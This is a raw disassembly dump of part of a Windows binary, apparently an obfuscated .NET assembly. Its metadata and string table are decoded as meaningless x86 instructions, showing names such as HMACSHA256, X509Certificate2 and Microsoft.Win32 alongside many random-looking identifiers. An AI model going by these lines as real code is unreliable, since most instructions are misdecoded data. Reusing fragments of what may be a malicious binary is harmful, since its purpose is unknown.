  4075e8:	bb 00 00 00 58       	mov    $0x58000000,%ebx
  4075ed:	08 b2 00 00 00 d0    	or     %dh,-0x30000000(%edx)
  4075f3:	0a bf 00 00 00 34    	or     0x34000000(%edi),%bh
  4075f9:	09 b7 00 00 00 9b    	or     %esi,-0x65000000(%edi)
  4075ff:	09 c3                	or     %eax,%ebx
  407601:	01 00                	add    %eax,(%eax)
  407603:	00 2d 08 f8 01 00    	add    %ch,0x1f808
  407609:	00 c1                	add    %al,%cl
  40760b:	09 fe                	or     %edi,%esi
  40760d:	01 00                	add    %eax,(%eax)
  40760f:	00 d2                	add    %dl,%dl
  407611:	08 69 02             	or     %ch,0x2(%ecx)
  407614:	00 00                	add    %al,(%eax)
  407616:	77 23                	ja     0x40763b
  407618:	6d                   	insl   (%dx),%es:(%edi)
  407619:	02 00                	add    (%eax),%al
  40761b:	00 29                	add    %ch,(%ecx)
  40761d:	1b 71 02             	sbb    0x2(%ecx),%esi
  407620:	00 00                	add    %al,(%eax)
  407622:	61                   	popa
  407623:	07                   	pop    %es
  407624:	75 02                	jne    0x407628
  407626:	00 00                	add    %al,(%eax)
  407628:	17                   	pop    %ss
  407629:	1b 7a 02             	sbb    0x2(%edx),%edi
  40762c:	02 00                	add    (%eax),%al
  40762e:	06                   	push   %es
  40762f:	00 03                	add    %al,(%ebx)
  407631:	00 01                	add    %al,(%ecx)
  407633:	00 07                	add    %al,(%edi)
  407635:	00 03                	add    %al,(%ebx)
  407637:	00 02                	add    %al,(%edx)
  407639:	00 08                	add    %cl,(%eax)
  40763b:	00 05 00 01 00 09    	add    %al,0x9000100
  407641:	00 05 00 02 00 0a    	add    %al,0xa000200
  407647:	00 07                	add    %al,(%edi)
  407649:	00 01                	add    %al,(%ecx)
  40764b:	00 0b                	add    %cl,(%ebx)
  40764d:	00 07                	add    %al,(%edi)
  40764f:	00 02                	add    %al,(%edx)
  407651:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407654:	09 00                	or     %eax,(%eax)
  407656:	01 00                	add    %eax,(%eax)
  407658:	0d 00 09 00 02       	or     $0x2000900,%eax
  40765d:	00 0e                	add    %cl,(%esi)
  40765f:	00 0b                	add    %cl,(%ebx)
  407661:	00 01                	add    %al,(%ecx)
  407663:	00 0f                	add    %cl,(%edi)
  407665:	00 0b                	add    %cl,(%ebx)
  407667:	00 02                	add    %al,(%edx)
  407669:	00 10                	add    %dl,(%eax)
  40766b:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407671:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407677:	00 0f                	add    %cl,(%edi)
  407679:	00 01                	add    %al,(%ecx)
  40767b:	00 13                	add    %dl,(%ebx)
  40767d:	00 0f                	add    %cl,(%edi)
  40767f:	00 02                	add    %al,(%edx)
  407681:	00 14 00             	add    %dl,(%eax,%eax,1)
  407684:	11 00                	adc    %eax,(%eax)
  407686:	02 00                	add    (%eax),%al
  407688:	15 00 13 00 01       	adc    $0x1001300,%eax
  40768d:	00 16                	add    %dl,(%esi)
  40768f:	00 13                	add    %dl,(%ebx)
  407691:	00 02                	add    %al,(%edx)
  407693:	00 17                	add    %dl,(%edi)
  407695:	00 15 00 01 00 18    	add    %dl,0x18000100
  40769b:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a1:	00 17                	add    %dl,(%edi)
  4076a3:	00 01                	add    %al,(%ecx)
  4076a5:	00 1a                	add    %bl,(%edx)
  4076a7:	00 17                	add    %dl,(%edi)
  4076a9:	00 02                	add    %al,(%edx)
  4076ab:	00 60 00             	add    %ah,0x0(%eax)
  4076ae:	19 00                	sbb    %eax,(%eax)
  4076b0:	02 00                	add    (%eax),%al
  4076b2:	68 00 1b 00 02       	push   $0x2001b00
  4076b7:	00 69 00             	add    %ch,0x0(%ecx)
  4076ba:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076bf:	00 1f                	add    %bl,(%edi)
  4076c1:	00 01                	add    %al,(%ecx)
  4076c3:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076ca:	8d 00                	lea    (%eax),%eax
  4076cc:	21 00                	and    %eax,(%eax)
  4076ce:	01 00                	add    %eax,(%eax)
  4076d0:	8e 00                	mov    (%eax),%es
  4076d2:	21 00                	and    %eax,(%eax)
  4076d4:	02 00                	add    (%eax),%al
  4076d6:	8f 00                	pop    (%eax)
  4076d8:	23 00                	and    (%eax),%eax
  4076da:	01 00                	add    %eax,(%eax)
  4076dc:	90                   	nop
  4076dd:	00 23                	add    %ah,(%ebx)
  4076df:	00 02                	add    %al,(%edx)
  4076e1:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076e7:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076ed:	00 c0                	add    %al,%al
  4076ef:	00 03                	add    %al,(%ebx)
  4076f1:	00 16                	add    %dl,(%esi)
  4076f3:	00 c2                	add    %al,%dl
  4076f5:	00 05 00 16 00 c4    	add    %al,0xc4001600
  4076fb:	00 07                	add    %al,(%edi)
  4076fd:	00 18                	add    %bl,(%eax)
  4076ff:	00 26                	add    %ah,(%esi)
  407701:	01 09                	add    %ecx,(%ecx)
  407703:	00 a5 17 98 17 b0    	add    %ah,-0x4fe867e9(%ebp)
  407709:	17                   	pop    %ss
  40770a:	ef                   	out    %eax,(%dx)
  40770b:	05 5b 06 75 06       	add    $0x675065b,%eax
  407710:	9c                   	pushf
  407711:	06                   	push   %es
  407712:	ff 06                	incl   (%esi)
  407714:	27                   	daa
  407715:	07                   	pop    %es
  407716:	00 01                	add    %al,(%ecx)
  407718:	71 00                	jno    0x40771a
  40771a:	6b 24 01 00          	imul   $0x0,(%ecx,%eax,1),%esp
  40771e:	00 01                	add    %al,(%ecx)
  407720:	73 00                	jae    0x407722
  407722:	59                   	pop    %ecx
  407723:	23 01                	and    (%ecx),%eax
  407725:	00 00                	add    %al,(%eax)
  407727:	01 75 00             	add    %esi,0x0(%ebp)
  40772a:	bd 0d 02 00 41       	mov    $0x4100020d,%ebp
  40772f:	01 77 00             	add    %esi,0x0(%edi)
  407732:	9d                   	popf
  407733:	22 02                	and    (%edx),%al
  407735:	00 40 01             	add    %al,0x1(%eax)
  407738:	79 00                	jns    0x40773a
  40773a:	db 0f                	fisttpl (%edi)
  40773c:	02 00                	add    (%eax),%al
  40773e:	40                   	inc    %eax
  40773f:	01 7b 00             	add    %edi,0x0(%ebx)
  407742:	22 17                	and    (%edi),%dl
  407744:	03 00                	add    (%eax),%eax
  407746:	50                   	push   %eax
  407747:	20 00                	and    %al,(%eax)
  407749:	00 2d 00 70 20 00    	add    %ch,0x207000
  40774f:	00 47 00             	add    %al,0x0(%edi)
  407752:	04 80                	add    $0x80,%al
  407754:	00 00                	add    %al,(%eax)
  407756:	01 00                	add    %eax,(%eax)
	...
  407764:	91                   	xchg   %eax,%ecx
  407765:	17                   	pop    %ss
  407766:	00 00                	add    %al,(%eax)
  407768:	04 00                	add    $0x0,%al
	...
  407772:	00 00                	add    %al,(%eax)
  407774:	01 00                	add    %eax,(%eax)
  407776:	18 0a                	sbb    %cl,(%edx)
  407778:	00 00                	add    %al,(%eax)
  40777a:	00 00                	add    %al,(%eax)
  40777c:	04 00                	add    $0x0,%al
	...
  407786:	00 00                	add    %al,(%eax)
  407788:	01 00                	add    %eax,(%eax)
  40778a:	36 18 00             	sbb    %al,%ss:(%eax)
  40778d:	00 00                	add    %al,(%eax)
  40778f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40779a:	00 00                	add    %al,(%eax)
  40779c:	cc                   	int3
  40779d:	00 3e                	add    %bh,(%esi)
  40779f:	14 00                	adc    $0x0,%al
  4077a1:	00 00                	add    %al,(%eax)
  4077a3:	00 04 00             	add    %al,(%eax,%eax,1)
  4077a6:	00 00                	add    %al,(%eax)
  4077a8:	00 00                	add    %al,(%eax)
  4077aa:	00 00                	add    %al,(%eax)
  4077ac:	70 00                	jo     0x4077ae
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	01 00                	add    %eax,(%eax)
  4077b2:	89 0f                	mov    %ecx,(%edi)
  4077b4:	00 00                	add    %al,(%eax)
  4077b6:	00 00                	add    %al,(%eax)
  4077b8:	0a 00                	or     (%eax),%al
	...
  4077c2:	00 00                	add    %al,(%eax)
  4077c4:	cc                   	int3
  4077c5:	00 a2 0a 00 00 00    	add    %ah,0xa(%edx)
  4077cb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077d6:	00 00                	add    %al,(%eax)
  4077d8:	cc                   	int3
  4077d9:	00 49 22             	add    %cl,0x22(%ecx)
  4077dc:	00 00                	add    %al,(%eax)
  4077de:	00 00                	add    %al,(%eax)
  4077e0:	04 00                	add    $0x0,%al
	...
  4077ea:	00 00                	add    %al,(%eax)
  4077ec:	01 00                	add    %eax,(%eax)
  4077ee:	31 20                	xor    %esp,(%eax)
  4077f0:	00 00                	add    %al,(%eax)
  4077f2:	00 00                	add    %al,(%eax)
  4077f4:	04 00                	add    $0x0,%al
  4077f6:	00 00                	add    %al,(%eax)
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	00 00                	add    %al,(%eax)
  4077fc:	70 00                	jo     0x4077fe
  4077fe:	00 00                	add    %al,(%eax)
  407800:	cc                   	int3
  407801:	00 74 1b 00          	add    %dh,0x0(%ebx,%ebx,1)
  407805:	00 00                	add    %al,(%eax)
  407807:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40780a:	0b 00                	or     (%eax),%eax
  40780c:	10 00                	adc    %al,(%eax)
  40780e:	0f 00 14 00          	lldt   (%eax,%eax,1)
  407812:	13 00                	adc    (%eax),%eax
  407814:	1e                   	push   %ds
  407815:	00 1d 00 75 01 8d    	add    %bl,0x8d017500
  40781b:	06                   	push   %es
  40781c:	00 41 63             	add    %al,0x63(%ecx)
  40781f:	74 69                	je     0x40788a
  407821:	6f                   	outsl  %ds:(%esi),(%dx)
  407822:	6e                   	outsb  %ds:(%esi),(%dx)
  407823:	60                   	pusha
  407824:	31 30                	xor    %esi,(%eax)
  407826:	00 49 45             	add    %cl,0x45(%ecx)
  407829:	6e                   	outsb  %ds:(%esi),(%dx)
  40782a:	75 6d                	jne    0x407899
  40782c:	65 72 61             	gs jb  0x407890
  40782f:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  407833:	31 00                	xor    %eax,(%eax)
  407835:	43                   	inc    %ebx
  407836:	61                   	popa
  407837:	6c                   	insb   (%dx),%es:(%edi)
  407838:	6c                   	insb   (%dx),%es:(%edi)
  407839:	53                   	push   %ebx
  40783a:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407841:	69 
  407842:	73 74                	jae    0x4078b8
  407844:	60                   	pusha
  407845:	31 00                	xor    %eax,(%eax)
  407847:	4d                   	dec    %ebp
  407848:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40784f:	74 2e                	je     0x40787f
  407851:	57                   	push   %edi
  407852:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  407859:	55                   	push   %ebp
  40785a:	49                   	dec    %ecx
  40785b:	6e                   	outsb  %ds:(%esi),(%dx)
  40785c:	74 33                	je     0x407891
  40785e:	32 00                	xor    (%eax),%al
  407860:	54                   	push   %esp
  407861:	6f                   	outsl  %ds:(%esi),(%dx)
  407862:	49                   	dec    %ecx
  407863:	6e                   	outsb  %ds:(%esi),(%dx)
  407864:	74 33                	je     0x407899
  407866:	32 00                	xor    (%eax),%al
  407868:	58                   	pop    %eax
  407869:	35 30 39 43 65       	xor    $0x65433930,%eax
  40786e:	72 74                	jb     0x4078e4
  407870:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  407877:	32 00                	xor    (%eax),%al
  407879:	54                   	push   %esp
  40787a:	6f                   	outsl  %ds:(%esi),(%dx)
  40787b:	55                   	push   %ebp
  40787c:	49                   	dec    %ecx
  40787d:	6e                   	outsb  %ds:(%esi),(%dx)
  40787e:	74 36                	je     0x4078b6
  407880:	34 00                	xor    $0x0,%al
  407882:	54                   	push   %esp
  407883:	6f                   	outsl  %ds:(%esi),(%dx)
  407884:	49                   	dec    %ecx
  407885:	6e                   	outsb  %ds:(%esi),(%dx)
  407886:	74 36                	je     0x4078be
  407888:	34 00                	xor    $0x0,%al
  40788a:	54                   	push   %esp
  40788b:	6f                   	outsl  %ds:(%esi),(%dx)
  40788c:	55                   	push   %ebp
  40788d:	49                   	dec    %ecx
  40788e:	6e                   	outsb  %ds:(%esi),(%dx)
  40788f:	74 31                	je     0x4078c2
  407891:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  407896:	6e                   	outsb  %ds:(%esi),(%dx)
  407897:	74 31                	je     0x4078ca
  407899:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  40789d:	41                   	inc    %ecx
  40789e:	43                   	inc    %ebx
  40789f:	53                   	push   %ebx
  4078a0:	48                   	dec    %eax
  4078a1:	41                   	inc    %ecx
  4078a2:	32 35 36 00 67 65    	xor    0x65670036,%dh
  4078a8:	74 5f                	je     0x407909
  4078aa:	55                   	push   %ebp
  4078ab:	54                   	push   %esp
  4078ac:	46                   	inc    %esi
  4078ad:	38 00                	cmp    %al,(%eax)
  4078af:	3c 4d                	cmp    $0x4d,%al
  4078b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4078b2:	64 75 6c             	fs jne 0x407921
  4078b5:	65 3e 00 46 44       	gs add %al,%ds:0x44(%esi)
  4078ba:	68 62 79 74 75       	push   $0x75747962
  4078bf:	4c                   	dec    %esp
  4078c0:	50                   	push   %eax
  4078c1:	62 51 74             	bound  %edx,0x74(%ecx)
  4078c4:	49                   	dec    %ecx
  4078c5:	41                   	inc    %ecx
  4078c6:	00 6a 70             	add    %ch,0x70(%edx)
  4078c9:	52                   	push   %edx
  4078ca:	45                   	inc    %ebp
  4078cb:	4b                   	dec    %ebx
  4078cc:	6a 55                	push   $0x55
  4078ce:	68 4d 64 59 63       	push   $0x6359644d
  4078d3:	41                   	inc    %ecx
  4078d4:	00 48 43             	add    %cl,0x43(%eax)
  4078d7:	62 75 4b             	bound  %esi,0x4b(%ebp)
  4078da:	6b 48 4a 6a          	imul   $0x6a,0x4a(%eax),%ecx
  4078de:	6f                   	outsl  %ds:(%esi),(%dx)
  4078df:	46                   	inc    %esi
  4078e0:	61                   	popa
  4078e1:	64 72 50             	fs jb  0x407934
  4078e4:	42                   	inc    %edx
  4078e5:	00 67 6d             	add    %ah,0x6d(%edi)
  4078e8:	51                   	push   %ecx
  4078e9:	67 4d                	addr16 dec %ebp
  4078eb:	54                   	push   %esp
  4078ec:	42                   	inc    %edx
  4078ed:	46                   	inc    %esi
  4078ee:	76 55                	jbe    0x407945
  4078f0:	6d                   	insl   (%dx),%es:(%edi)
  4078f1:	56                   	push   %esi
  4078f2:	42                   	inc    %edx
  4078f3:	00 56 66             	add    %dl,0x66(%esi)
  4078f6:	49                   	dec    %ecx
  4078f7:	55                   	push   %ebp
  4078f8:	4b                   	dec    %ebx
  4078f9:	57                   	push   %edi
  4078fa:	71 4f                	jno    0x40794b
  4078fc:	77 4b                	ja     0x407949
  4078fe:	5a                   	pop    %edx
  4078ff:	42                   	inc    %edx
  407900:	00 47 43             	add    %al,0x43(%edi)
  407903:	00 45 69             	add    %al,0x69(%ebp)
  407906:	79 4c                	jns    0x407954
  407908:	68 75 4e 66 6e       	push   $0x6e664e75
  40790d:	48                   	dec    %eax
  40790e:	43                   	inc    %ebx
  40790f:	00 63 48             	add    %ah,0x48(%ebx)
  407912:	4e                   	dec    %esi
  407913:	70 62                	jo     0x407977
  407915:	5a                   	pop    %edx
  407916:	7a 69                	jp     0x407981
  407918:	6f                   	outsl  %ds:(%esi),(%dx)
  407919:	4d                   	dec    %ebp
  40791a:	63 43 00             	arpl   %eax,0x0(%ebx)
  40791d:	77 6e                	ja     0x40798d
  40791f:	54                   	push   %esp
  407920:	62 65 51             	bound  %esp,0x51(%ebp)
  407923:	63 69 45             	arpl   %ebp,0x45(%ecx)
  407926:	7a 63                	jp     0x40798b
  407928:	43                   	inc    %ebx
  407929:	00 69 4a             	add    %ch,0x4a(%ecx)
  40792c:	56                   	push   %esi
  40792d:	66 79 71             	data16 jns 0x4079a1
  407930:	4f                   	dec    %edi
  407931:	69 43 45 52 71 43 00 	imul   $0x437152,0x45(%ebx),%eax
  407938:	61                   	popa
  407939:	55                   	push   %ebp
  40793a:	76 4b                	jbe    0x407987
  40793c:	55                   	push   %ebp
  40793d:	79 6e                	jns    0x4079ad
  40793f:	43                   	inc    %ebx
  407940:	6b 6f 75 74          	imul   $0x74,0x75(%edi),%ebp
  407944:	43                   	inc    %ebx
  407945:	00 4d 61             	add    %cl,0x61(%ebp)
  407948:	70 4e                	jo     0x407998
  40794a:	61                   	popa
  40794b:	6d                   	insl   (%dx),%es:(%edi)
  40794c:	65 54                	gs push %esp
  40794e:	6f                   	outsl  %ds:(%esi),(%dx)
  40794f:	4f                   	dec    %edi
  407950:	49                   	dec    %ecx
  407951:	44                   	inc    %esp
  407952:	00 67 65             	add    %ah,0x65(%edi)
  407955:	74 5f                	je     0x4079b6
  407957:	46                   	inc    %esi
  407958:	6f                   	outsl  %ds:(%esi),(%dx)
  407959:	72 6d                	jb     0x4079c8
  40795b:	61                   	popa
  40795c:	74 49                	je     0x4079a7
  40795e:	44                   	inc    %esp
  40795f:	00 64 54 59          	add    %ah,0x59(%esp,%edx,2)
  407963:	4b                   	dec    %ebx
  407964:	6e                   	outsb  %ds:(%esi),(%dx)
  407965:	7a 5a                	jp     0x4079c1
  407967:	65 59                	gs pop %ecx
  407969:	65 65 49             	gs gs dec %ecx
  40796c:	53                   	push   %ebx
  40796d:	44                   	inc    %esp
  40796e:	00 47 6e             	add    %al,0x6e(%edi)
  407971:	4e                   	dec    %esi
  407972:	76 58                	jbe    0x4079cc
  407974:	63 66 46             	arpl   %esp,0x46(%esi)
  407977:	72 77                	jb     0x4079f0
  407979:	70 57                	jo     0x4079d2
  40797b:	44                   	inc    %esp
  40797c:	00 46 50             	add    %al,0x50(%esi)
  40797f:	45                   	inc    %ebp
  407980:	47                   	inc    %edi
  407981:	64 64 41             	fs fs inc %ecx
  407984:	55                   	push   %ebp
  407985:	52                   	push   %edx
  407986:	67 63 73 44          	arpl   %esi,0x44(%bp,%di)
  40798a:	00 4d 65             	add    %cl,0x65(%ebp)
  40798d:	6e                   	outsb  %ds:(%esi),(%dx)
  40798e:	46                   	inc    %esi
  40798f:	74 41                	je     0x4079d2
  407991:	61                   	popa
  407992:	53                   	push   %ebx
  407993:	73 77                	jae    0x407a0c
  407995:	6f                   	outsl  %ds:(%esi),(%dx)
  407996:	62 6c 73 44          	bound  %ebp,0x44(%ebx,%esi,2)
  40799a:	00 75 71             	add    %dh,0x71(%ebp)
  40799d:	61                   	popa
  40799e:	50                   	push   %eax
  40799f:	4a                   	dec    %edx
  4079a0:	5a                   	pop    %edx
  4079a1:	66 55                	push   %bp
  4079a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4079a4:	74 50                	je     0x4079f6
  4079a6:	74 44                	je     0x4079ec
  4079a8:	00 66 6c             	add    %ah,0x6c(%esi)
  4079ab:	4d                   	dec    %ebp
  4079ac:	44                   	inc    %esp
  4079ad:	57                   	push   %edi
  4079ae:	4e                   	dec    %esi
  4079af:	47                   	inc    %edi
  4079b0:	47                   	inc    %edi
  4079b1:	62 6e 41             	bound  %ebp,0x41(%esi)
  4079b4:	41                   	inc    %ecx
  4079b5:	78 44                	js     0x4079fb
  4079b7:	00 43 46             	add    %al,0x46(%ebx)
  4079ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4079bb:	51                   	push   %ecx
  4079bc:	6c                   	insb   (%dx),%es:(%edi)
  4079bd:	4a                   	dec    %edx
  4079be:	4f                   	dec    %edi
  4079bf:	48                   	dec    %eax
  4079c0:	56                   	push   %esi
  4079c1:	59                   	pop    %ecx
  4079c2:	45                   	inc    %ebp
  4079c3:	00 76 55             	add    %dh,0x55(%esi)
  4079c6:	73 51                	jae    0x407a19
  4079c8:	43                   	inc    %ebx
  4079c9:	58                   	pop    %eax
  4079ca:	63 44 72 72          	arpl   %eax,0x72(%edx,%esi,2)
  4079ce:	5a                   	pop    %edx
  4079cf:	45                   	inc    %ebp
  4079d0:	00 51 70             	add    %dl,0x70(%ecx)
  4079d3:	4b                   	dec    %ebx
  4079d4:	75 52                	jne    0x407a28
  4079d6:	7a 4b                	jp     0x407a23
  4079d8:	4c                   	dec    %esp
  4079d9:	6b 6f 6d 45          	imul   $0x45,0x6d(%edi),%ebp
  4079dd:	00 4e 50             	add    %cl,0x50(%esi)
  4079e0:	69 65 64 42 77 49 62 	imul   $0x62497742,0x64(%ebp),%esp
  4079e7:	4c                   	dec    %esp
  4079e8:	62 53 72             	bound  %edx,0x72(%ebx)
  4079eb:	45                   	inc    %ebp
  4079ec:	00 57 52             	add    %dl,0x52(%edi)
  4079ef:	52                   	push   %edx
  4079f0:	6c                   	insb   (%dx),%es:(%edi)
  4079f1:	59                   	pop    %ecx
  4079f2:	56                   	push   %esi
  4079f3:	44                   	inc    %esp
  4079f4:	4c                   	dec    %esp
  4079f5:	53                   	push   %ebx
  4079f6:	57                   	push   %edi
  4079f7:	77 45                	ja     0x407a3e
  4079f9:	00 72 73             	add    %dh,0x73(%edx)
  4079fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4079fd:	57                   	push   %edi
  4079fe:	4c                   	dec    %esp
  4079ff:	73 76                	jae    0x407a77
  407a01:	69 79 45 00 77 49 77 	imul   $0x77497700,0x45(%ecx),%edi
  407a08:	71 66                	jno    0x407a70
  407a0a:	52                   	push   %edx
  407a0b:	68 69 79 46 55       	push   $0x55467969
  407a10:	52                   	push   %edx
  407a11:	75 71                	jne    0x407a84
  407a13:	46                   	inc    %esi
  407a14:	46                   	inc    %esi
  407a15:	00 62 58             	add    %ah,0x58(%edx)
  407a18:	76 6f                	jbe    0x407a89
  407a1a:	55                   	push   %ebp
  407a1b:	49                   	dec    %ecx
  407a1c:	74 68                	je     0x407a86
  407a1e:	76 78                	jbe    0x407a98
  407a20:	42                   	inc    %edx
  407a21:	6e                   	outsb  %ds:(%esi),(%dx)
  407a22:	62 53 46             	bound  %edx,0x46(%ebx)
  407a25:	00 48 4f             	add    %cl,0x4f(%eax)
  407a28:	43                   	inc    %ebx
  407a29:	54                   	push   %esp
  407a2a:	62 6a 47             	bound  %ebp,0x47(%edx)
  407a2d:	54                   	push   %esp
  407a2e:	49                   	dec    %ecx
  407a2f:	79 4e                	jns    0x407a7f
  407a31:	49                   	dec    %ecx
  407a32:	5a                   	pop    %edx
  407a33:	46                   	inc    %esi
  407a34:	00 79 71             	add    %bh,0x71(%ecx)
  407a37:	45                   	inc    %ebp
  407a38:	76 49                	jbe    0x407a83
  407a3a:	56                   	push   %esi
  407a3b:	45                   	inc    %ebp
  407a3c:	49                   	dec    %ecx
  407a3d:	75 68                	jne    0x407aa7
  407a3f:	46                   	inc    %esi
  407a40:	00 65 56             	add    %ah,0x56(%ebp)
  407a43:	6b 67 58 75          	imul   $0x75,0x58(%edi),%esp
  407a47:	44                   	inc    %esp
  407a48:	6a 44                	push   $0x44
  407a4a:	42                   	inc    %edx
  407a4b:	50                   	push   %eax
  407a4c:	47                   	inc    %edi
  407a4d:	00 65 70             	add    %ah,0x70(%ebp)
  407a50:	7a 49                	jp     0x407a9b
  407a52:	77 53                	ja     0x407aa7
  407a54:	4c                   	dec    %esp
  407a55:	61                   	popa
  407a56:	6c                   	insb   (%dx),%es:(%edi)
  407a57:	41                   	inc    %ecx
  407a58:	48                   	dec    %eax
  407a59:	00 4d 52             	add    %cl,0x52(%ebp)
  407a5c:	57                   	push   %edi
  407a5d:	55                   	push   %ebp
  407a5e:	51                   	push   %ecx
  407a5f:	48                   	dec    %eax
  407a60:	58                   	pop    %eax
  407a61:	72 63                	jb     0x407ac6
  407a63:	65 46                	gs inc %esi
  407a65:	48                   	dec    %eax
  407a66:	00 66 46             	add    %ah,0x46(%esi)
  407a69:	67 46                	addr16 inc %esi
  407a6b:	79 49                	jns    0x407ab6
  407a6d:	46                   	inc    %esi
  407a6e:	53                   	push   %ebx
  407a6f:	54                   	push   %esp
  407a70:	48                   	dec    %eax
  407a71:	00 54 75 79          	add    %dl,0x79(%ebp,%esi,2)
  407a75:	5a                   	pop    %edx
  407a76:	76 6a                	jbe    0x407ae2
  407a78:	4a                   	dec    %edx
  407a79:	41                   	inc    %ecx
  407a7a:	77 67                	ja     0x407ae3
  407a7c:	56                   	push   %esi
  407a7d:	48                   	dec    %eax
  407a7e:	00 70 6c             	add    %dh,0x6c(%eax)
  407a81:	6a 6d                	push   $0x6d
  407a83:	4b                   	dec    %ebx
  407a84:	6c                   	insb   (%dx),%es:(%edi)
  407a85:	54                   	push   %esp
  407a86:	52                   	push   %edx
  407a87:	67 72 48             	addr16 jb 0x407ad2
  407a8a:	00 62 74             	add    %ah,0x74(%edx)
  407a8d:	69 7a 53 4e 53 77 7a 	imul   $0x7a77534e,0x53(%edx),%edi
  407a94:	76 48                	jbe    0x407ade
  407a96:	00 5a 74             	add    %bl,0x74(%edx)
  407a99:	43                   	inc    %ebx
  407a9a:	63 46 58             	arpl   %eax,0x58(%esi)
  407a9d:	79 4d                	jns    0x407aec
  407a9f:	6e                   	outsb  %ds:(%esi),(%dx)
  407aa0:	5a                   	pop    %edx
  407aa1:	73 6f                	jae    0x407b12
  407aa3:	77 48                	ja     0x407aed
  407aa5:	00 76 61             	add    %dh,0x61(%esi)
  407aa8:	67 68 70 54 78 4b    	addr16 push $0x4b785470
  407aae:	74 7a                	je     0x407b2a
  407ab0:	4b                   	dec    %ebx
  407ab1:	4b                   	dec    %ebx
  407ab2:	63 44 44 49          	arpl   %eax,0x49(%esp,%eax,2)
  407ab6:	00 65 46             	add    %ah,0x46(%ebp)
  407ab9:	57                   	push   %edi
  407aba:	44                   	inc    %esp
  407abb:	52                   	push   %edx
  407abc:	65 44                	gs inc %esp
  407abe:	6d                   	insl   (%dx),%es:(%edi)
  407abf:	75 74                	jne    0x407b35
  407ac1:	6e                   	outsb  %ds:(%esi),(%dx)
  407ac2:	45                   	inc    %ebp
  407ac3:	49                   	dec    %ecx
  407ac4:	00 72 62             	add    %dh,0x62(%edx)
  407ac7:	63 6c 48 68          	arpl   %ebp,0x68(%eax,%ecx,2)
  407acb:	6c                   	insb   (%dx),%es:(%edi)
  407acc:	61                   	popa
  407acd:	4a                   	dec    %edx
  407ace:	6e                   	outsb  %ds:(%esi),(%dx)
  407acf:	47                   	inc    %edi
  407ad0:	48                   	dec    %eax
  407ad1:	49                   	dec    %ecx
  407ad2:	00 44 68 46          	add    %al,0x46(%eax,%ebp,2)
  407ad6:	66 54                	push   %sp
  407ad8:	76 52                	jbe    0x407b2c
  407ada:	74 70                	je     0x407b4c
  407adc:	79 62                	jns    0x407b40
  407ade:	48                   	dec    %eax
  407adf:	49                   	dec    %ecx
  407ae0:	00 67 65             	add    %ah,0x65(%edi)
  407ae3:	74 5f                	je     0x407b44
  407ae5:	41                   	inc    %ecx
  407ae6:	53                   	push   %ebx
  407ae7:	43                   	inc    %ebx
  407ae8:	49                   	dec    %ecx
  407ae9:	49                   	dec    %ecx
  407aea:	00 5a 7a             	add    %bl,0x7a(%edx)
  407aed:	74 57                	je     0x407b46
  407aef:	67 69 6c 66 52 73 4f 	imul   $0x494f7352,0x66(%si),%ebp
  407af6:	49 
  407af7:	00 4c 4e 68          	add    %cl,0x68(%esi,%ecx,2)
  407afb:	6b 46 53 56          	imul   $0x56,0x53(%esi),%eax
  407aff:	56                   	push   %esi
  407b00:	75 54                	jne    0x407b56
  407b02:	4b                   	dec    %ebx
  407b03:	6b 53 49 00          	imul   $0x0,0x49(%ebx),%edx
  407b07:	52                   	push   %edx
  407b08:	63 7a 63             	arpl   %edi,0x63(%edx)
  407b0b:	47                   	inc    %edi
  407b0c:	45                   	inc    %ebp
  407b0d:	73 49                	jae    0x407b58
  407b0f:	50                   	push   %eax
  407b10:	4e                   	dec    %esi
  407b11:	53                   	push   %ebx
  407b12:	46                   	inc    %esi
  407b13:	4b                   	dec    %ebx
  407b14:	62 49 00             	bound  %ecx,0x0(%ecx)
  407b17:	6f                   	outsl  %ds:(%esi),(%dx)
  407b18:	7a 75                	jp     0x407b8f
  407b1a:	67 4f                	addr16 dec %edi
  407b1c:	72 47                	jb     0x407b65
  407b1e:	51                   	push   %ecx
  407b1f:	70 51                	jo     0x407b72
  407b21:	78 6b                	js     0x407b8e
  407b23:	49                   	dec    %ecx
  407b24:	00 4d 52             	add    %cl,0x52(%ebp)
  407b27:	73 52                	jae    0x407b7b
  407b29:	72 7a                	jb     0x407ba5
  407b2b:	52                   	push   %edx
  407b2c:	7a 71                	jp     0x407b9f
  407b2e:	76 4e                	jbe    0x407b7e
  407b30:	4c                   	dec    %esp
  407b31:	6d                   	insl   (%dx),%es:(%edi)
  407b32:	49                   	dec    %ecx
  407b33:	00 51 4f             	add    %dl,0x4f(%ecx)
  407b36:	4b                   	dec    %ebx
  407b37:	67 4d                	addr16 dec %ebp
  407b39:	46                   	inc    %esi
  407b3a:	61                   	popa
  407b3b:	4b                   	dec    %ebx
  407b3c:	72 49                	jb     0x407b87
  407b3e:	00 72 46             	add    %dh,0x46(%edx)
  407b41:	62 70 6a             	bound  %esi,0x6a(%eax)
  407b44:	67 41                	addr16 inc %ecx
  407b46:	76 56                	jbe    0x407b9e
  407b48:	52                   	push   %edx
  407b49:	72 49                	jb     0x407b94
  407b4b:	00 6f 58             	add    %ch,0x58(%edi)
